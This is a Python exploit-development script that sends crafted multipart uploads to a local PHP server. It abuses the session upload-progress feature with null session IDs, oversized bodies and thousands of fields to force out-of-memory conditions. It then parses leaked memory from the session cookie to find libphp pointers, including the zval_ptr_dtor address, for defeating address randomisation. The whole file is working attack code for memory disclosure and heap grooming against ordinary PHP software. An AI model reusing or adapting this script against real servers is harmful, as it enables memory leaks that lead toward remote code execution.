import sys, time, struct
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, build_multipart, parse_cookie

URL = "http://127.0.0.1:18112/index.php"
dtor_offset = 0x49ec50
SID = b"attacksessionid0001"
t = Target(URL, timeout=120, verbose=False)
libphp_lo, libphp_hi = 0x7a43d9480000, 0x7a43da000000

def big(): return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def oom(nfields):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(nfields)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

def leak(nfields, stage2_t=406, stage2_v=16):
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(nfields):
        cnt = stage2_v if i == stage2_t else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    return parse_cookie(resp)

def analyze(raw, label):
    if not raw:
        print(f"{label}: NO COOKIE")
        return
    ptrs = []
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            ptrs.append(v)
    has_dtor = any((v & 0xFFFFFFFF) == (dtor_offset + (0 if False else 0)) or (v - 0x7a43d9480000) & 0xFFF == dtor_offset & 0xFFF for v in ptrs)
    # simpler: check if any ptr == libphp_base + dtor_offset
    libbase = 0x7a43d9480000
    dtor_hit = any(v == libbase + dtor_offset for v in ptrs)
    libptrs = [v for v in ptrs if libphp_lo <= v < libphp_hi]
    print(f"{label}: cookie={len(raw)}B ptrs={len(ptrs)} libphp_ptrs={len(libptrs)} ZVAL_PTR_DTOR={'YES' if dtor_hit else 'no'}")
    for v in libptrs[:5]:
        print(f"    libphp+{v-libbase:#x} = {v:#x}")

# Sweep OOM field count
for nfields in [1001, 800, 600]:
    rotate()
    oom(nfields)
    raw = leak(983)
    analyze(raw, f"OOM={nfields} leak=983")
